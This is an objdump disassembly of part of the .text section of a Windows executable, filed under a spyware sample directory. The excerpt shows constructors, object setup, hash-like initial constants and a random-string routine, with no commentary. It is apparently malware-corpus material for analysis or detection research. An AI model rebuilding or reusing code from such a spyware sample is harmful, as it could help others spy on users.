
malware_samples/spyware/cad291a2df541313c6d296dcb798f5565ce591ca94f4649c21bc0e8b7e7a86eb.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	53                   	push   %ebx
  401001:	56                   	push   %esi
  401002:	57                   	push   %edi
  401003:	8b f9                	mov    %ecx,%edi
  401005:	c7 07 d8 86 41 00    	movl   $0x4186d8,(%edi)
  40100b:	ff 15 74 80 41 00    	call   *0x418074
  401011:	50                   	push   %eax
  401012:	ff 15 70 85 41 00    	call   *0x418570
  401018:	8b 1d 6c 85 41 00    	mov    0x41856c,%ebx
  40101e:	83 c4 04             	add    $0x4,%esp
  401021:	33 f6                	xor    %esi,%esi
  401023:	ff d3                	call   *%ebx
  401025:	99                   	cltd
  401026:	b9 af 00 00 00       	mov    $0xaf,%ecx
  40102b:	f7 f9                	idiv   %ecx
  40102d:	80 c2 41             	add    $0x41,%dl
  401030:	88 54 3e 04          	mov    %dl,0x4(%esi,%edi,1)
  401034:	46                   	inc    %esi
  401035:	83 fe 10             	cmp    $0x10,%esi
  401038:	7c e9                	jl     0x401023
  40103a:	8b c7                	mov    %edi,%eax
  40103c:	5f                   	pop    %edi
  40103d:	5e                   	pop    %esi
  40103e:	5b                   	pop    %ebx
  40103f:	c3                   	ret
  401040:	56                   	push   %esi
  401041:	8b f1                	mov    %ecx,%esi
  401043:	e8 18 00 00 00       	call   0x401060
  401048:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40104d:	74 09                	je     0x401058
  40104f:	56                   	push   %esi
  401050:	e8 5b 2e 01 00       	call   0x413eb0
  401055:	83 c4 04             	add    $0x4,%esp
  401058:	8b c6                	mov    %esi,%eax
  40105a:	5e                   	pop    %esi
  40105b:	c2 04 00             	ret    $0x4
  40105e:	90                   	nop
  40105f:	90                   	nop
  401060:	c7 01 d8 86 41 00    	movl   $0x4186d8,(%ecx)
  401066:	c3                   	ret
  401067:	90                   	nop
  401068:	90                   	nop
  401069:	90                   	nop
  40106a:	90                   	nop
  40106b:	90                   	nop
  40106c:	90                   	nop
  40106d:	90                   	nop
  40106e:	90                   	nop
  40106f:	90                   	nop
  401070:	c7 41 04 67 45 23 01 	movl   $0x1234567,0x4(%ecx)
  401077:	c7 41 08 ef cd ab 89 	movl   $0x89abcdef,0x8(%ecx)
  40107e:	c7 41 0c 98 ba dc fe 	movl   $0xfedcba98,0xc(%ecx)
  401085:	c7 41 10 10 32 54 76 	movl   $0x76543210,0x10(%ecx)
  40108c:	c3                   	ret
  40108d:	90                   	nop
  40108e:	90                   	nop
  40108f:	90                   	nop
  401090:	81 79 04 67 45 23 01 	cmpl   $0x1234567,0x4(%ecx)
  401097:	74 03                	je     0x40109c
  401099:	33 c0                	xor    %eax,%eax
  40109b:	c3                   	ret
  40109c:	81 79 08 ef cd ab 89 	cmpl   $0x89abcdef,0x8(%ecx)
  4010a3:	74 03                	je     0x4010a8
  4010a5:	33 c0                	xor    %eax,%eax
  4010a7:	c3                   	ret
  4010a8:	81 79 0c 98 ba dc fe 	cmpl   $0xfedcba98,0xc(%ecx)
  4010af:	74 03                	je     0x4010b4
  4010b1:	33 c0                	xor    %eax,%eax
  4010b3:	c3                   	ret
  4010b4:	8b 51 10             	mov    0x10(%ecx),%edx
  4010b7:	33 c0                	xor    %eax,%eax
  4010b9:	81 fa 10 32 54 76    	cmp    $0x76543210,%edx
  4010bf:	0f 94 c0             	sete   %al
  4010c2:	c3                   	ret
  4010c3:	90                   	nop
  4010c4:	90                   	nop
  4010c5:	90                   	nop
  4010c6:	90                   	nop
  4010c7:	90                   	nop
  4010c8:	90                   	nop
  4010c9:	90                   	nop
  4010ca:	90                   	nop
  4010cb:	90                   	nop
  4010cc:	90                   	nop
  4010cd:	90                   	nop
  4010ce:	90                   	nop
  4010cf:	90                   	nop
  4010d0:	53                   	push   %ebx
  4010d1:	56                   	push   %esi
  4010d2:	57                   	push   %edi
  4010d3:	8b d9                	mov    %ecx,%ebx
  4010d5:	ff 15 74 80 41 00    	call   *0x418074
  4010db:	50                   	push   %eax
  4010dc:	ff 15 70 85 41 00    	call   *0x418570
  4010e2:	8b 3d 6c 85 41 00    	mov    0x41856c,%edi
  4010e8:	83 c4 04             	add    $0x4,%esp
  4010eb:	33 f6                	xor    %esi,%esi
  4010ed:	ff d7                	call   *%edi
  4010ef:	99                   	cltd
  4010f0:	b9 af 00 00 00       	mov    $0xaf,%ecx
  4010f5:	f7 f9                	idiv   %ecx
  4010f7:	80 c2 41             	add    $0x41,%dl
  4010fa:	88 54 1e 04          	mov    %dl,0x4(%esi,%ebx,1)
  4010fe:	46                   	inc    %esi
  4010ff:	83 fe 10             	cmp    $0x10,%esi
  401102:	7c e9                	jl     0x4010ed
  401104:	5f                   	pop    %edi
  401105:	5e                   	pop    %esi
  401106:	5b                   	pop    %ebx
  401107:	c3                   	ret
  401108:	90                   	nop
  401109:	90                   	nop
  40110a:	90                   	nop
  40110b:	90                   	nop
  40110c:	90                   	nop
  40110d:	90                   	nop
  40110e:	90                   	nop
  40110f:	90                   	nop
  401110:	33 c0                	xor    %eax,%eax
  401112:	89 41 04             	mov    %eax,0x4(%ecx)
  401115:	89 41 08             	mov    %eax,0x8(%ecx)
  401118:	89 41 0c             	mov    %eax,0xc(%ecx)
  40111b:	89 41 10             	mov    %eax,0x10(%ecx)
  40111e:	c3                   	ret
  40111f:	90                   	nop
  401120:	8b 44 24 04          	mov    0x4(%esp),%eax
  401124:	8b 10                	mov    (%eax),%edx
  401126:	89 51 04             	mov    %edx,0x4(%ecx)
  401129:	8b 50 04             	mov    0x4(%eax),%edx
  40112c:	89 51 08             	mov    %edx,0x8(%ecx)
  40112f:	8b 50 08             	mov    0x8(%eax),%edx
  401132:	89 51 0c             	mov    %edx,0xc(%ecx)
  401135:	8b 40 0c             	mov    0xc(%eax),%eax
  401138:	89 41 10             	mov    %eax,0x10(%ecx)
  40113b:	c2 04 00             	ret    $0x4
  40113e:	90                   	nop
  40113f:	90                   	nop
  401140:	8b 44 24 04          	mov    0x4(%esp),%eax
  401144:	8b 51 04             	mov    0x4(%ecx),%edx
  401147:	89 10                	mov    %edx,(%eax)
  401149:	8b 51 08             	mov    0x8(%ecx),%edx
  40114c:	89 50 04             	mov    %edx,0x4(%eax)
  40114f:	8b 51 0c             	mov    0xc(%ecx),%edx
  401152:	89 50 08             	mov    %edx,0x8(%eax)
  401155:	8b 49 10             	mov    0x10(%ecx),%ecx
  401158:	89 48 0c             	mov    %ecx,0xc(%eax)
  40115b:	c2 04 00             	ret    $0x4
  40115e:	90                   	nop
  40115f:	90                   	nop
  401160:	8b 44 24 04          	mov    0x4(%esp),%eax
  401164:	8b 50 04             	mov    0x4(%eax),%edx
  401167:	89 51 04             	mov    %edx,0x4(%ecx)
  40116a:	8b 50 08             	mov    0x8(%eax),%edx
  40116d:	89 51 08             	mov    %edx,0x8(%ecx)
  401170:	8b 50 0c             	mov    0xc(%eax),%edx
  401173:	89 51 0c             	mov    %edx,0xc(%ecx)
  401176:	8b 40 10             	mov    0x10(%eax),%eax
  401179:	89 41 10             	mov    %eax,0x10(%ecx)
  40117c:	c2 04 00             	ret    $0x4
  40117f:	90                   	nop
  401180:	8b 44 24 04          	mov    0x4(%esp),%eax
  401184:	8b 51 10             	mov    0x10(%ecx),%edx
  401187:	56                   	push   %esi
  401188:	3b 50 10             	cmp    0x10(%eax),%edx
  40118b:	74 06                	je     0x401193
  40118d:	33 c0                	xor    %eax,%eax
  40118f:	5e                   	pop    %esi
  401190:	c2 04 00             	ret    $0x4
  401193:	8b 51 0c             	mov    0xc(%ecx),%edx
  401196:	8b 70 0c             	mov    0xc(%eax),%esi
  401199:	3b d6                	cmp    %esi,%edx
  40119b:	74 06                	je     0x4011a3
  40119d:	33 c0                	xor    %eax,%eax
  40119f:	5e                   	pop    %esi
  4011a0:	c2 04 00             	ret    $0x4
  4011a3:	8b 51 08             	mov    0x8(%ecx),%edx
  4011a6:	8b 70 08             	mov    0x8(%eax),%esi
  4011a9:	3b d6                	cmp    %esi,%edx
  4011ab:	74 06                	je     0x4011b3
  4011ad:	33 c0                	xor    %eax,%eax
  4011af:	5e                   	pop    %esi
  4011b0:	c2 04 00             	ret    $0x4
  4011b3:	8b 49 04             	mov    0x4(%ecx),%ecx
  4011b6:	8b 70 04             	mov    0x4(%eax),%esi
  4011b9:	33 d2                	xor    %edx,%edx
  4011bb:	3b ce                	cmp    %esi,%ecx
  4011bd:	0f 94 c2             	sete   %dl
  4011c0:	8b c2                	mov    %edx,%eax
  4011c2:	5e                   	pop    %esi
  4011c3:	c2 04 00             	ret    $0x4
  4011c6:	90                   	nop
  4011c7:	90                   	nop
  4011c8:	90                   	nop
  4011c9:	90                   	nop
  4011ca:	90                   	nop
  4011cb:	90                   	nop
  4011cc:	90                   	nop
  4011cd:	90                   	nop
  4011ce:	90                   	nop
  4011cf:	90                   	nop
  4011d0:	e8 0b 00 00 00       	call   0x4011e0
  4011d5:	e9 16 00 00 00       	jmp    0x4011f0
  4011da:	90                   	nop
  4011db:	90                   	nop
  4011dc:	90                   	nop
  4011dd:	90                   	nop
  4011de:	90                   	nop
  4011df:	90                   	nop
  4011e0:	b9 94 af 46 00       	mov    $0x46af94,%ecx
  4011e5:	e9 16 fe ff ff       	jmp    0x401000
  4011ea:	90                   	nop
  4011eb:	90                   	nop
  4011ec:	90                   	nop
  4011ed:	90                   	nop
  4011ee:	90                   	nop
  4011ef:	90                   	nop
  4011f0:	68 00 12 40 00       	push   $0x401200
  4011f5:	e8 4e 33 01 00       	call   0x414548
  4011fa:	59                   	pop    %ecx
  4011fb:	c3                   	ret
  4011fc:	90                   	nop
  4011fd:	90                   	nop
  4011fe:	90                   	nop
  4011ff:	90                   	nop
  401200:	b9 94 af 46 00       	mov    $0x46af94,%ecx
  401205:	e9 56 fe ff ff       	jmp    0x401060
  40120a:	90                   	nop
  40120b:	90                   	nop
  40120c:	90                   	nop
  40120d:	90                   	nop
  40120e:	90                   	nop
  40120f:	90                   	nop
  401210:	e8 0b 00 00 00       	call   0x401220
  401215:	e9 16 00 00 00       	jmp    0x401230
  40121a:	90                   	nop
  40121b:	90                   	nop
  40121c:	90                   	nop
  40121d:	90                   	nop
  40121e:	90                   	nop
  40121f:	90                   	nop
  401220:	b9 80 af 46 00       	mov    $0x46af80,%ecx
  401225:	e9 d6 fd ff ff       	jmp    0x401000
  40122a:	90                   	nop
  40122b:	90                   	nop
  40122c:	90                   	nop
  40122d:	90                   	nop
  40122e:	90                   	nop
  40122f:	90                   	nop
  401230:	68 40 12 40 00       	push   $0x401240
  401235:	e8 0e 33 01 00       	call   0x414548
  40123a:	59                   	pop    %ecx
  40123b:	c3                   	ret
  40123c:	90                   	nop
  40123d:	90                   	nop
  40123e:	90                   	nop
  40123f:	90                   	nop
  401240:	b9 80 af 46 00       	mov    $0x46af80,%ecx
  401245:	e9 16 fe ff ff       	jmp    0x401060
  40124a:	90                   	nop
  40124b:	90                   	nop
  40124c:	90                   	nop
  40124d:	90                   	nop
  40124e:	90                   	nop
  40124f:	90                   	nop
  401250:	8b 44 24 04          	mov    0x4(%esp),%eax
  401254:	56                   	push   %esi
  401255:	8b 71 04             	mov    0x4(%ecx),%esi
  401258:	8b 50 04             	mov    0x4(%eax),%edx
  40125b:	03 d6                	add    %esi,%edx
  40125d:	89 15 84 af 46 00    	mov    %edx,0x46af84
  401263:	8b 50 08             	mov    0x8(%eax),%edx
  401266:	03 51 08             	add    0x8(%ecx),%edx
  401269:	89 15 88 af 46 00    	mov    %edx,0x46af88
  40126f:	8b 50 0c             	mov    0xc(%eax),%edx
  401272:	8b 71 0c             	mov    0xc(%ecx),%esi
  401275:	03 d6                	add    %esi,%edx
  401277:	5e                   	pop    %esi
  401278:	89 15 8c af 46 00    	mov    %edx,0x46af8c
  40127e:	8b 40 10             	mov    0x10(%eax),%eax
  401281:	03 41 10             	add    0x10(%ecx),%eax
  401284:	a3 90 af 46 00       	mov    %eax,0x46af90
  401289:	b8 80 af 46 00       	mov    $0x46af80,%eax
  40128e:	c2 04 00             	ret    $0x4
  401291:	90                   	nop
  401292:	90                   	nop
  401293:	90                   	nop
  401294:	90                   	nop
  401295:	90                   	nop
  401296:	90                   	nop
  401297:	90                   	nop
  401298:	90                   	nop
  401299:	90                   	nop
  40129a:	90                   	nop
  40129b:	90                   	nop
  40129c:	90                   	nop
  40129d:	90                   	nop
  40129e:	90                   	nop
  40129f:	90                   	nop
  4012a0:	6a ff                	push   $0xffffffff
  4012a2:	68 63 49 41 00       	push   $0x414963
  4012a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4012ad:	50                   	push   %eax
  4012ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4012b5:	51                   	push   %ecx
  4012b6:	56                   	push   %esi
  4012b7:	8b f1                	mov    %ecx,%esi
  4012b9:	6a 00                	push   $0x0
  4012bb:	6a 64                	push   $0x64
  4012bd:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4012c1:	e8 fe 2c 01 00       	call   0x413fc4
  4012c6:	8d 4e 60             	lea    0x60(%esi),%ecx
  4012c9:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4012d0:	00 
  4012d1:	e8 9a 25 00 00       	call   0x403870
  4012d6:	8d 8e 20 01 00 00    	lea    0x120(%esi),%ecx
  4012dc:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  4012e1:	e8 8a 25 00 00       	call   0x403870
  4012e6:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4012ea:	c7 06 00 87 41 00    	movl   $0x418700,(%esi)
  4012f0:	8b c6                	mov    %esi,%eax
  4012f2:	5e                   	pop    %esi
  4012f3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4012fa:	83 c4 10             	add    $0x10,%esp
  4012fd:	c3                   	ret
  4012fe:	90                   	nop
  4012ff:	90                   	nop
  401300:	56                   	push   %esi
  401301:	8b f1                	mov    %ecx,%esi
  401303:	e8 18 00 00 00       	call   0x401320
  401308:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40130d:	74 09                	je     0x401318
  40130f:	56                   	push   %esi
  401310:	e8 9b 2b 01 00       	call   0x413eb0
  401315:	83 c4 04             	add    $0x4,%esp
  401318:	8b c6                	mov    %esi,%eax
  40131a:	5e                   	pop    %esi
  40131b:	c2 04 00             	ret    $0x4
  40131e:	90                   	nop
  40131f:	90                   	nop
  401320:	6a ff                	push   $0xffffffff
  401322:	68 83 49 41 00       	push   $0x414983
  401327:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40132d:	50                   	push   %eax
  40132e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401335:	51                   	push   %ecx
  401336:	56                   	push   %esi
  401337:	8b f1                	mov    %ecx,%esi
  401339:	89 74 24 04          	mov    %esi,0x4(%esp)
  40133d:	8d 8e 20 01 00 00    	lea    0x120(%esi),%ecx
  401343:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  40134a:	00 
  40134b:	e8 e0 25 00 00       	call   0x403930
  401350:	8d 4e 60             	lea    0x60(%esi),%ecx
  401353:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  401358:	e8 d3 25 00 00       	call   0x403930
  40135d:	8b ce                	mov    %esi,%ecx
  40135f:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  401366:	ff 
  401367:	e8 52 2c 01 00       	call   0x413fbe
  40136c:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401370:	5e                   	pop    %esi
  401371:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401378:	83 c4 10             	add    $0x10,%esp
  40137b:	c3                   	ret
  40137c:	90                   	nop
  40137d:	90                   	nop
  40137e:	90                   	nop
  40137f:	90                   	nop
  401380:	56                   	push   %esi
  401381:	8b f1                	mov    %ecx,%esi
  401383:	57                   	push   %edi
  401384:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  401388:	8d 46 60             	lea    0x60(%esi),%eax
  40138b:	50                   	push   %eax
  40138c:	68 00 04 00 00       	push   $0x400
  401391:	57                   	push   %edi
  401392:	e8 33 2c 01 00       	call   0x413fca
  401397:	81 c6 20 01 00 00    	add    $0x120,%esi
  40139d:	56                   	push   %esi
  40139e:	68 01 04 00 00       	push   $0x401
  4013a3:	57                   	push   %edi
  4013a4:	e8 21 2c 01 00       	call   0x413fca
  4013a9:	5f                   	pop    %edi
  4013aa:	5e                   	pop    %esi
  4013ab:	c2 04 00             	ret    $0x4
  4013ae:	90                   	nop
  4013af:	90                   	nop
  4013b0:	b8 f4 86 41 00       	mov    $0x4186f4,%eax
  4013b5:	c3                   	ret
  4013b6:	90                   	nop
  4013b7:	90                   	nop
  4013b8:	90                   	nop
  4013b9:	90                   	nop
  4013ba:	90                   	nop
  4013bb:	90                   	nop
  4013bc:	90                   	nop
  4013bd:	90                   	nop
  4013be:	90                   	nop
  4013bf:	90                   	nop
  4013c0:	51                   	push   %ecx
  4013c1:	53                   	push   %ebx
  4013c2:	56                   	push   %esi
  4013c3:	57                   	push   %edi
  4013c4:	8b f1                	mov    %ecx,%esi
  4013c6:	e8 17 2c 01 00       	call   0x413fe2
  4013cb:	51                   	push   %ecx
  4013cc:	8b cc                	mov    %esp,%ecx
  4013ce:	89 64 24 10          	mov    %esp,0x10(%esp)
  4013d2:	68 48 e0 41 00       	push   $0x41e048
  4013d7:	e8 00 2c 01 00       	call   0x413fdc
  4013dc:	8d be 20 01 00 00    	lea    0x120(%esi),%edi
  4013e2:	8b cf                	mov    %edi,%ecx
  4013e4:	e8 e7 27 00 00       	call   0x403bd0
  4013e9:	6a 00                	push   $0x0
  4013eb:	8b cf                	mov    %edi,%ecx
  4013ed:	e8 6e 28 00 00       	call   0x403c60
  4013f2:	e8 df 2b 01 00       	call   0x413fd6
  4013f7:	68 8f 00 00 00       	push   $0x8f
  4013fc:	6a 0c                	push   $0xc
  4013fe:	68 8f 00 00 00       	push   $0x8f
  401403:	e8 c8 2b 01 00       	call   0x413fd0
  401408:	8b 1d a8 86 41 00    	mov    0x4186a8,%ebx
  40140e:	50                   	push   %eax
  40140f:	ff d3                	call   *%ebx
  401411:	51                   	push   %ecx
  401412:	89 86 80 01 00 00    	mov    %eax,0x180(%esi)
  401418:	8b cc                	mov    %esp,%ecx
  40141a:	89 64 24 10          	mov    %esp,0x10(%esp)
  40141e:	68 30 e0 41 00       	push   $0x41e030
  401423:	e8 b4 2b 01 00       	call   0x413fdc
  401428:	8d 7e 60             	lea    0x60(%esi),%edi
  40142b:	8b cf                	mov    %edi,%ecx
  40142d:	e8 9e 27 00 00       	call   0x403bd0
  401432:	6a 00                	push   $0x0
  401434:	8b cf                	mov    %edi,%ecx
  401436:	e8 25 28 00 00       	call   0x403c60
  40143b:	e8 96 2b 01 00       	call   0x413fd6
  401440:	68 8f 00 00 00       	push   $0x8f
  401445:	6a 0c                	push   $0xc
  401447:	68 8f 00 00 00       	push   $0x8f
  40144c:	e8 7f 2b 01 00       	call   0x413fd0
  401451:	50                   	push   %eax
  401452:	ff d3                	call   *%ebx
  401454:	89 86 c0 00 00 00    	mov    %eax,0xc0(%esi)
  40145a:	5f                   	pop    %edi
  40145b:	5e                   	pop    %esi
  40145c:	b8 01 00 00 00       	mov    $0x1,%eax
  401461:	5b                   	pop    %ebx
  401462:	59                   	pop    %ecx
  401463:	c3                   	ret
  401464:	90                   	nop
  401465:	90                   	nop
  401466:	90                   	nop
  401467:	90                   	nop
  401468:	90                   	nop
  401469:	90                   	nop
  40146a:	90                   	nop
  40146b:	90                   	nop
  40146c:	90                   	nop
  40146d:	90                   	nop
  40146e:	90                   	nop
  40146f:	90                   	nop
  401470:	c2 04 00             	ret    $0x4
  401473:	90                   	nop
  401474:	90                   	nop
  401475:	90                   	nop
  401476:	90                   	nop
  401477:	90                   	nop
  401478:	90                   	nop
  401479:	90                   	nop
  40147a:	90                   	nop
  40147b:	90                   	nop
  40147c:	90                   	nop
  40147d:	90                   	nop
  40147e:	90                   	nop
  40147f:	90                   	nop
  401480:	c3                   	ret
  401481:	90                   	nop
  401482:	90                   	nop
  401483:	90                   	nop
  401484:	90                   	nop
  401485:	90                   	nop
  401486:	90                   	nop
  401487:	90                   	nop
  401488:	90                   	nop
  401489:	90                   	nop
  40148a:	90                   	nop
  40148b:	90                   	nop
  40148c:	90                   	nop
  40148d:	90                   	nop
  40148e:	90                   	nop
  40148f:	90                   	nop
  401490:	8b 41 20             	mov    0x20(%ecx),%eax
  401493:	6a 00                	push   $0x0
  401495:	50                   	push   %eax
  401496:	ff 15 98 86 41 00    	call   *0x418698
  40149c:	c3                   	ret
  40149d:	90                   	nop
  40149e:	90                   	nop
  40149f:	90                   	nop
  4014a0:	8b 41 20             	mov    0x20(%ecx),%eax
  4014a3:	6a 01                	push   $0x1
  4014a5:	50                   	push   %eax
  4014a6:	ff 15 98 86 41 00    	call   *0x418698
  4014ac:	c3                   	ret
  4014ad:	90                   	nop
  4014ae:	90                   	nop
  4014af:	90                   	nop
  4014b0:	6a ff                	push   $0xffffffff
  4014b2:	68 bf 49 41 00       	push   $0x4149bf
  4014b7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4014bd:	50                   	push   %eax
  4014be:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4014c5:	51                   	push   %ecx
  4014c6:	53                   	push   %ebx
  4014c7:	56                   	push   %esi
  4014c8:	8b f1                	mov    %ecx,%esi
  4014ca:	89 74 24 08          	mov    %esi,0x8(%esp)
  4014ce:	e8 69 2b 01 00       	call   0x41403c
  4014d3:	c7 06 30 89 41 00    	movl   $0x418930,(%esi)
  4014d9:	33 db                	xor    %ebx,%ebx
  4014db:	8d 4e 5c             	lea    0x5c(%esi),%ecx
  4014de:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4014e2:	e8 4f 2b 01 00       	call   0x414036
  4014e7:	8d 8e c4 00 00 00    	lea    0xc4(%esi),%ecx
  4014ed:	c6 44 24 14 01       	movb   $0x1,0x14(%esp)
  4014f2:	e8 39 2b 01 00       	call   0x414030
  4014f7:	89 9e d8 00 00 00    	mov    %ebx,0xd8(%esi)
  4014fd:	c7 86 d4 00 00 00 1c 	movl   $0x41891c,0xd4(%esi)
  401504:	89 41 00 
  401507:	b8 01 00 00 00       	mov    $0x1,%eax
  40150c:	53                   	push   %ebx
  40150d:	8b ce                	mov    %esi,%ecx
  40150f:	c6 44 24 18 03       	movb   $0x3,0x18(%esp)
  401514:	c7 06 58 88 41 00    	movl   $0x418858,(%esi)
  40151a:	89 5e 50             	mov    %ebx,0x50(%esi)
  40151d:	89 9e b8 00 00 00    	mov    %ebx,0xb8(%esi)
  401523:	89 9e bc 00 00 00    	mov    %ebx,0xbc(%esi)
  401529:	88 9e c1 00 00 00    	mov    %bl,0xc1(%esi)
  40152f:	88 9e c0 00 00 00    	mov    %bl,0xc0(%esi)
  401535:	89 5e 58             	mov    %ebx,0x58(%esi)
  401538:	89 46 4c             	mov    %eax,0x4c(%esi)
  40153b:	89 46 48             	mov    %eax,0x48(%esi)
  40153e:	89 5e 40             	mov    %ebx,0x40(%esi)
  401541:	89 46 44             	mov    %eax,0x44(%esi)
  401544:	89 5e 54             	mov    %ebx,0x54(%esi)
  401547:	89 9e e4 00 00 00    	mov    %ebx,0xe4(%esi)
  40154d:	e8 9e 10 00 00       	call   0x4025f0
  401552:	53                   	push   %ebx
  401553:	8b ce                	mov    %esi,%ecx
  401555:	e8 d6 10 00 00       	call   0x402630
  40155a:	53                   	push   %ebx
  40155b:	8b ce                	mov    %esi,%ecx
  40155d:	e8 0e 11 00 00       	call   0x402670
  401562:	53                   	push   %ebx
  401563:	8b ce                	mov    %esi,%ecx
  401565:	e8 46 11 00 00       	call   0x4026b0
  40156a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40156e:	89 5e 7c             	mov    %ebx,0x7c(%esi)
  401571:	89 9e e0 00 00 00    	mov    %ebx,0xe0(%esi)
  401577:	89 9e dc 00 00 00    	mov    %ebx,0xdc(%esi)
  40157d:	8b c6                	mov    %esi,%eax
  40157f:	5e                   	pop    %esi
  401580:	5b                   	pop    %ebx
  401581:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401588:	83 c4 10             	add    $0x10,%esp
  40158b:	c3                   	ret
  40158c:	90                   	nop
  40158d:	90                   	nop
  40158e:	90                   	nop
  40158f:	90                   	nop
  401590:	56                   	push   %esi
  401591:	8b f1                	mov    %ecx,%esi
  401593:	e8 18 00 00 00       	call   0x4015b0
  401598:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40159d:	74 09                	je     0x4015a8
  40159f:	56                   	push   %esi
  4015a0:	e8 0b 29 01 00       	call   0x413eb0
  4015a5:	83 c4 04             	add    $0x4,%esp
  4015a8:	8b c6                	mov    %esi,%eax
  4015aa:	5e                   	pop    %esi
  4015ab:	c2 04 00             	ret    $0x4
  4015ae:	90                   	nop
  4015af:	90                   	nop
  4015b0:	6a ff                	push   $0xffffffff
  4015b2:	68 07 4a 41 00       	push   $0x414a07
  4015b7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4015bd:	50                   	push   %eax
  4015be:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4015c5:	83 ec 08             	sub    $0x8,%esp
  4015c8:	56                   	push   %esi
  4015c9:	8b f1                	mov    %ecx,%esi
  4015cb:	57                   	push   %edi
  4015cc:	89 74 24 08          	mov    %esi,0x8(%esp)
  4015d0:	c7 06 58 88 41 00    	movl   $0x418858,(%esi)
  4015d6:	8b 8e c8 00 00 00    	mov    0xc8(%esi),%ecx
  4015dc:	c7 44 24 18 03 00 00 	movl   $0x3,0x18(%esp)
  4015e3:	00 
  4015e4:	85 c9                	test   %ecx,%ecx
  4015e6:	74 14                	je     0x4015fc
  4015e8:	8b 86 dc 00 00 00    	mov    0xdc(%esi),%eax
  4015ee:	85 c0                	test   %eax,%eax
  4015f0:	74 0a                	je     0x4015fc
  4015f2:	8b 40 04             	mov    0x4(%eax),%eax
  4015f5:	50                   	push   %eax
  4015f6:	51                   	push   %ecx
  4015f7:	e8 58 2a 01 00       	call   0x414054
  4015fc:	8d be d4 00 00 00    	lea    0xd4(%esi),%edi
  401602:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  401606:	c7 07 08 8a 41 00    	movl   $0x418a08,(%edi)
  40160c:	8b cf                	mov    %edi,%ecx
  40160e:	c6 44 24 18 04       	movb   $0x4,0x18(%esp)
  401613:	e8 36 2a 01 00       	call   0x41404e
  401618:	8d 8e c4 00 00 00    	lea    0xc4(%esi),%ecx
  40161e:	c7 07 f4 89 41 00    	movl   $0x4189f4,(%edi)
  401624:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
  401629:	e8 f0 29 01 00       	call   0x41401e
  40162e:	8d 4e 5c             	lea    0x5c(%esi),%ecx
  401631:	c6 44 24 18 00       	movb   $0x0,0x18(%esp)
  401636:	e8 e9 29 01 00       	call   0x414024
  40163b:	8b ce                	mov    %esi,%ecx
  40163d:	c7 44 24 18 ff ff ff 	movl   $0xffffffff,0x18(%esp)
  401644:	ff 
  401645:	e8 e0 29 01 00       	call   0x41402a
  40164a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40164e:	5f                   	pop    %edi
  40164f:	5e                   	pop    %esi
  401650:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401657:	83 c4 14             	add    $0x14,%esp
  40165a:	c3                   	ret
  40165b:	90                   	nop
  40165c:	90                   	nop
  40165d:	90                   	nop
  40165e:	90                   	nop
  40165f:	90                   	nop
  401660:	b8 50 88 41 00       	mov    $0x418850,%eax
  401665:	c3                   	ret
  401666:	90                   	nop
  401667:	90                   	nop
  401668:	90                   	nop
  401669:	90                   	nop
  40166a:	90                   	nop
  40166b:	90                   	nop
  40166c:	90                   	nop
  40166d:	90                   	nop
  40166e:	90                   	nop
  40166f:	90                   	nop
  401670:	83 ec 14             	sub    $0x14,%esp
  401673:	53                   	push   %ebx
  401674:	56                   	push   %esi
  401675:	8b 74 24 20          	mov    0x20(%esp),%esi
  401679:	57                   	push   %edi
  40167a:	81 e6 ff ff 00 00    	and    $0xffff,%esi
  401680:	6a 0e                	push   $0xe
  401682:	56                   	push   %esi
  401683:	8b f9                	mov    %ecx,%edi
  401685:	e8 46 29 01 00       	call   0x413fd0
  40168a:	6a 00                	push   $0x0
  40168c:	6a 00                	push   $0x0
  40168e:	6a 00                	push   $0x0
  401690:	8b d8                	mov    %eax,%ebx
  401692:	6a 01                	push   $0x1
  401694:	56                   	push   %esi
  401695:	8b 35 8c 86 41 00    	mov    0x41868c,%esi
  40169b:	53                   	push   %ebx
  40169c:	ff d6                	call   *%esi
  40169e:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4016a2:	89 87 b8 00 00 00    	mov    %eax,0xb8(%edi)
  4016a8:	85 c9                	test   %ecx,%ecx
  4016aa:	74 12                	je     0x4016be
  4016ac:	6a 00                	push   $0x0
  4016ae:	6a 00                	push   $0x0
  4016b0:	6a 00                	push   $0x0
  4016b2:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4016b8:	6a 01                	push   $0x1
  4016ba:	51                   	push   %ecx
  4016bb:	53                   	push   %ebx
  4016bc:	ff d6                	call   *%esi
  4016be:	89 87 bc 00 00 00    	mov    %eax,0xbc(%edi)
  4016c4:	8b 97 b8 00 00 00    	mov    0xb8(%edi),%edx
  4016ca:	33 c0                	xor    %eax,%eax
  4016cc:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4016d0:	89 44 24 0c          	mov    %eax,0xc(%esp)
